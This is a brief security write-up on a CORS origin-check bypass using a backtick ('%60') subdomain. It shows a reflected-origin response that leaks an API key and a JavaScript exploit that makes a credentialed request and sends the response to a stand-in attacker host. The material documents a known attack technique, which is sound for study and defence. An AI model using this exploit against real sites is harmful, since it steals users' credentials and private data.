# Backtick Bypass

## Description
The origin verification is flawed and can be bypassed using a backtick (`).

**Severity**: High

## Exploit 
Set the origin header to `%60.example.com`

### Vulnerable Implementation
```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://%60.example.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://%60.example.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Exploit
This exploit requires that the respective JS script is hosted at `%60.example.com`
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
